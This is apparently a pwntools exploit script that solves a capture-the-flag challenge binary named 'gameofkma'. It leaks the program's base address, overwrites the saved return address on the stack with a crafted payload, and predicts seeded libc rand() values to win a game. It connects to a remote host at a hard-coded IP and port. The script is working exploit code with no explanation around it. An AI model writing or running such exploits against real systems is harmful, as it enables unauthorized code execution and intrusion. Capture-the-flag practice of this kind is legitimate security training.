#!/usr/bin/python3

from pwn import *
from ctypes import*

exe = ELF('./gameofkma_patched', checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)
glibc = cdll.LoadLibrary(libc.path)

context.binary = exe
context.log_level = 'debug'

if args.LOCAL:
    p = process(exe.path)
else:
    p = remote('45.77.248.50', 1337)

#################################
### Stage 1: Leak exe address ###
#################################
p.sendlineafter(b'(0-5)', b'5')
p.sendlineafter(b'(0-2)\n', b'2')

exe_leak = u64(p.recvline()[:-1] + b'\x00\x00')
exe.address = exe_leak - 0x1e8a
log.info("Exe base: " + hex(exe.address))

#########################
### Stage 2: Get flag ###
#########################

p.sendlineafter(b'(0-2)\n', b'2')

payload = p32(18)
payload += p64(0)                           # Saved rbp
payload += p64(exe.address + 0x1d72)[:4]    # Saved rip
p.sendafter(b'hero?\n', payload)
payload = b'1'*0xc + p64(exe.address + 0x1d72)[4:]
p.sendafter(b'hero?\n', payload)

glibc.srand(0x1337)
for i in range(7):
    p.recvuntil(b'(1/0)\n')
    p.sendline(b'1')
    p.sendlineafter(b'> ', str(glibc.rand() % 2022).encode())

p.interactive()